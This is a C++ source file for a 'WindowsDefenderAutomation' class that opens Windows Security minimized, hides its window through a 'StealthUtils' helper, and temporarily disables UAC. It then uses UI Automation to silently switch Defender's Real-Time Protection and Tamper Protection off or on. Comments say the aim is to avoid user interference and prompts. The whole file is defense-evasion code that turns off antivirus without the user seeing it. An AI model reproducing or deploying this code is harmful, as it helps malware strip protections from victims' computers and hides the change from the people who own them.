#include "WinDefCtl.h"
#include "StealthUtils.h" // Required for UAC and Window Cloaking features
#include <iostream>
#include <thread>
#include <chrono>

using namespace std::chrono_literals;

#if DEBUG_LOGGING_ENABLED
    #define LOG(msg) std::wcout << msg
#else
    #define LOG(msg) ((void)0)
#endif

// ============================================================================
// Windows Defender Automation Implementation
// ============================================================================

WindowsDefenderAutomation::WindowsDefenderAutomation() {
    CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    CoCreateInstance(CLSID_CUIAutomation, nullptr, CLSCTX_INPROC_SERVER, IID_IUIAutomation, (void**)&pAutomation);
    
    // Check if we need to recover UAC from a previous crash
    StealthUtils::RecoverUACIfNeeded(); 
}

WindowsDefenderAutomation::~WindowsDefenderAutomation() {
    if (pRootElement) pRootElement->Release();
    if (pAutomation) pAutomation->Release();
    CoUninitialize();
}

bool WindowsDefenderAutomation::openDefenderSettings() {
    LOG(L"\n  [*] Opening Windows Defender...\n");
    
    // Open window in background/minimized to avoid user interference
    ShellExecuteW(nullptr, L"open", L"windowsdefender://threatsettings", nullptr, nullptr, SW_SHOWMINNOACTIVE);
    
    // Use StealthUtils to find and hide the window (Retry 40 times * 250ms = 10 sec for slow PCs)
    hwndSecurity = StealthUtils::FindAndCloakSecurityWindow(40);

    // Wait for internal UI to load (100 retries * 100ms = 10 sec)
    if (!hwndSecurity || !waitForUILoaded(100)) { 
        std::wcout << L"  [ERROR] Failed to load UI (Timeout on slow system).\n";
        return false;
    }
    return true;
}

bool WindowsDefenderAutomation::waitForUILoaded(int maxRetries) {
    for (int i = 0; i < maxRetries; ++i) {
        try {
            if (pRootElement) pRootElement->Release();
            HRESULT hr = pAutomation->ElementFromHandle(hwndSecurity, &pRootElement);
            
            if (SUCCEEDED(hr)) {
                // Check if element tree is populated (more than 10 elements means it's loaded)
                if (countTotalElements() > 10) return true;
            }
        }
        catch (...) {}
        std::this_thread::sleep_for(100ms);
    }
    return false;
}

// ============================================================================
// UI Automation Helpers
// ============================================================================

IUIAutomationElement* WindowsDefenderAutomation::findFirstToggleSwitch() {
    IUIAutomationCondition* pCondition = nullptr;
    VARIANT var;
    var.vt = VT_I4;
    var.lVal = UIA_ButtonControlTypeId;
    pAutomation->CreatePropertyCondition(UIA_ControlTypePropertyId, var, &pCondition);

    IUIAutomationElementArray* pButtons = nullptr;
    if (!pRootElement) return nullptr;
    
    HRESULT hr = pRootElement->FindAll(TreeScope_Descendants, pCondition, &pButtons);
    pCondition->Release();

    if (FAILED(hr) || !pButtons) return nullptr;

    int count = 0;
    pButtons->get_Length(&count);

    for (int i = 0; i < count; ++i) {
        IUIAutomationElement* pButton = nullptr;
        pButtons->GetElement(i, &pButton);
        
        IUIAutomationTogglePattern* pToggle = nullptr;
        hr = pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

        if (SUCCEEDED(hr) && pToggle != nullptr) {
            pToggle->Release();
            pButtons->Release();
            return pButton;
        }
        pButton->Release();
    }
    pButtons->Release();
    return nullptr;
}

IUIAutomationElement* WindowsDefenderAutomation::findLastToggleSwitch() {
    IUIAutomationCondition* pCondition = nullptr;
    VARIANT var;
    var.vt = VT_I4;
    var.lVal = UIA_ButtonControlTypeId;
    pAutomation->CreatePropertyCondition(UIA_ControlTypePropertyId, var, &pCondition);

    IUIAutomationElementArray* pButtons = nullptr;
    if (!pRootElement) return nullptr;

    HRESULT hr = pRootElement->FindAll(TreeScope_Descendants, pCondition, &pButtons);
    pCondition->Release();

    if (FAILED(hr) || !pButtons) return nullptr;

    int count = 0;
    pButtons->get_Length(&count);
    IUIAutomationElement* pLastToggle = nullptr;

    for (int i = 0; i < count; ++i) {
        IUIAutomationElement* pButton = nullptr;
        pButtons->GetElement(i, &pButton);
        
        IUIAutomationTogglePattern* pToggle = nullptr;
        hr = pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

        if (SUCCEEDED(hr) && pToggle != nullptr) {
            pToggle->Release();
            if (pLastToggle) pLastToggle->Release();
            pLastToggle = pButton;
        } else {
            pButton->Release();
        }
    }
    pButtons->Release();
    return pLastToggle;
}

int WindowsDefenderAutomation::countTotalElements() {
    if (!pRootElement) return 0;
    IUIAutomationCondition* pCondition = nullptr;
    pAutomation->CreateTrueCondition(&pCondition); // Matches everything
    
    IUIAutomationElementArray* pElements = nullptr;
    pRootElement->FindAll(TreeScope_Descendants, pCondition, &pElements);
    pCondition->Release();

    int count = 0;
    if (pElements) {
        pElements->get_Length(&count);
        pElements->Release();
    }
    return count;
}

bool WindowsDefenderAutomation::waitForStructureChange(int baselineCount, bool expectIncrease, int timeoutSeconds) {
    LOG(L"  [*] Waiting for UI update...");
    int maxLoops = timeoutSeconds * 10;
    
    for (int i = 0; i < maxLoops; ++i) {
        int currentCount = countTotalElements();
        bool structureChanged = expectIncrease ? (currentCount > baselineCount) : (currentCount < baselineCount);

        if (structureChanged) {
            std::this_thread::sleep_for(200ms); // Stabilization delay
            int recheckCount = countTotalElements();
            bool stable = expectIncrease ? (recheckCount > baselineCount) : (recheckCount < baselineCount);
            
            if (stable) {
                LOG(L" [OK]\n");
                return true;
            }
        }
        std::this_thread::sleep_for(100ms);
    }
    LOG(L" [WARN] Timeout.\n");
    return false;
}

void WindowsDefenderAutomation::closeSecurityWindow() {
    if (hwndSecurity) SendMessage(hwndSecurity, WM_CLOSE, 0, 0);
}

// ============================================================================
// Real-Time Protection Operations
// ============================================================================

bool WindowsDefenderAutomation::toggleRealTimeProtection() {
    if (!StealthUtils::BackupAndDisableUAC()) return false;
    
    IUIAutomationElement* pButton = findFirstToggleSwitch();
    if (!pButton) { StealthUtils::RestoreUAC(); return false; }

    IUIAutomationTogglePattern* pToggle = nullptr;
    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

    bool result = false;
    if (pToggle) {
        ToggleState stateBefore;
        pToggle->get_CurrentToggleState(&stateBefore);
        int baseline = countTotalElements();

        pToggle->Toggle();
        pToggle->Release();
        pButton->Release();

        result = waitForStructureChange(baseline, (stateBefore == ToggleState_On));
    } else {
        pButton->Release();
    }
    
    StealthUtils::RestoreUAC();
    return result;
}

bool WindowsDefenderAutomation::enableRealTimeProtection() {
    // Backup and disable UAC to prevent prompts
    if (!StealthUtils::BackupAndDisableUAC()) return false;
    
    // Find the first toggle switch (Real-Time Protection)
    IUIAutomationElement* pButton = findFirstToggleSwitch();
    if (!pButton) { 
        StealthUtils::RestoreUAC(); 
        return false; 
    }

    // Get the toggle pattern interface
    IUIAutomationTogglePattern* pToggle = nullptr;
    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

    bool result = true;
    if (pToggle) {
        // Check current state
        ToggleState state;
        pToggle->get_CurrentToggleState(&state);
        
        if (state == ToggleState_Off) {
            // RTP is OFF, need to enable it
            int baseline = countTotalElements();
            pToggle->Toggle();
            pToggle->Release();
            pButton->Release();
            result = waitForStructureChange(baseline, false);
        } else {
            // Already enabled, just inform the user
            std::wcout << L"  [*] RTP already enabled\n";
            pToggle->Release();
            pButton->Release();
        }
    } else {
        pButton->Release();
        result = false;
    }
    
    // Restore original UAC settings
    StealthUtils::RestoreUAC();
    return result;
}

bool WindowsDefenderAutomation::disableRealTimeProtection() {
    if (!StealthUtils::BackupAndDisableUAC()) return false;
    
    IUIAutomationElement* pButton = findFirstToggleSwitch();
    if (!pButton) { StealthUtils::RestoreUAC(); return false; }

    IUIAutomationTogglePattern* pToggle = nullptr;
    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

    bool result = true;
    if (pToggle) {
        ToggleState state;
        pToggle->get_CurrentToggleState(&state);
        
        if (state == ToggleState_On) {
            int baseline = countTotalElements();
            pToggle->Toggle();
            pToggle->Release();
            pButton->Release();
            result = waitForStructureChange(baseline, true);
        } else {
			std::wcout << L"  [*] RTP already disabled\n";
            pToggle->Release();
            pButton->Release();
        }
    } else {
        pButton->Release();
        result = false;
    }
    
    StealthUtils::RestoreUAC();
    return result;
}

bool WindowsDefenderAutomation::getRealTimeProtectionStatus() {
    IUIAutomationElement* pButton = findFirstToggleSwitch();
    if (!pButton) return false;

    IUIAutomationTogglePattern* pToggle = nullptr;
    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

    bool isEnabled = false;
    if (pToggle) {
        ToggleState state;
        pToggle->get_CurrentToggleState(&state);
        isEnabled = (state == ToggleState_On);
        std::wcout << L"  [*] RTP Status: " << (isEnabled ? L"ENABLED" : L"DISABLED") << L"\n";
        pToggle->Release();
    }
    pButton->Release();
    return isEnabled;
}

// ============================================================================
// Tamper Protection Operations
// ============================================================================

bool WindowsDefenderAutomation::toggleTamperProtection() {
    if (!StealthUtils::BackupAndDisableUAC()) return false;
    
    IUIAutomationElement* pButton = findLastToggleSwitch();
    if (!pButton) { StealthUtils::RestoreUAC(); return false; }

    IUIAutomationTogglePattern* pToggle = nullptr;
    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

    bool result = false;
    if (pToggle) {
        ToggleState stateBefore;
        pToggle->get_CurrentToggleState(&stateBefore);
        int baseline = countTotalElements();

        pToggle->Toggle();
        pToggle->Release();
        pButton->Release();

        result = waitForStructureChange(baseline, (stateBefore == ToggleState_On));
    } else {
        pButton->Release();
    }
    
    StealthUtils::RestoreUAC();
    return result;
}

bool WindowsDefenderAutomation::enableTamperProtection() {
    // Backup and disable UAC to prevent prompts
    if (!StealthUtils::BackupAndDisableUAC()) return false;
    
    // Find the last toggle switch (Tamper Protection is the last one)
    IUIAutomationElement* pButton = findLastToggleSwitch();
    if (!pButton) { 
        StealthUtils::RestoreUAC(); 
        return false; 
    }

    // Get the toggle pattern interface
    IUIAutomationTogglePattern* pToggle = nullptr;
    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

    bool result = true;
    if (pToggle) {
        // Check current state
        ToggleState state;
        pToggle->get_CurrentToggleState(&state);
        
        if (state == ToggleState_Off) {
            // Tamper Protection is OFF, need to enable it
            int baseline = countTotalElements();
            pToggle->Toggle();
            pToggle->Release();
            pButton->Release();
            result = waitForStructureChange(baseline, false);
        } else {
            // Already enabled, just inform the user
            std::wcout << L"  [*] Tamper Protection already enabled\n";
            pToggle->Release();
            pButton->Release();
        }
    } else {
        pButton->Release();
        result = false;
    }
    
    // Restore original UAC settings
    StealthUtils::RestoreUAC();
    return result;
}

bool WindowsDefenderAutomation::disableTamperProtection() {
    if (!StealthUtils::BackupAndDisableUAC()) return false;
    
    IUIAutomationElement* pButton = findLastToggleSwitch();
    if (!pButton) { StealthUtils::RestoreUAC(); return false; }

    IUIAutomationTogglePattern* pToggle = nullptr;
    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

    bool result = true;
    if (pToggle) {
        ToggleState state;
        pToggle->get_CurrentToggleState(&state);
        
        if (state == ToggleState_On) {
            int baseline = countTotalElements();
            pToggle->Toggle();
            pToggle->Release();
            pButton->Release();
            result = waitForStructureChange(baseline, true);
        } else {
			std::wcout << L"  [*] Tamper Protection already disabled\n";
            pToggle->Release();
            pButton->Release();
        }
    } else {
        pButton->Release();
        result = false;
    }
    
    StealthUtils::RestoreUAC();
    return result;
}

bool WindowsDefenderAutomation::getTamperProtectionStatus() {
    IUIAutomationElement* pButton = findLastToggleSwitch();
    if (!pButton) return false;

    IUIAutomationTogglePattern* pToggle = nullptr;
    pButton->GetCurrentPatternAs(UIA_TogglePatternId, IID_IUIAutomationTogglePattern, (void**)&pToggle);

    bool isEnabled = false;
    if (pToggle) {
        ToggleState state;
        pToggle->get_CurrentToggleState(&state);
        isEnabled = (state == ToggleState_On);
        std::wcout << L"  [*] Tamper Protection Status: " << (isEnabled ? L"ENABLED" : L"DISABLED") << L"\n";
        pToggle->Release();
    }
    pButton->Release();
    return isEnabled;
}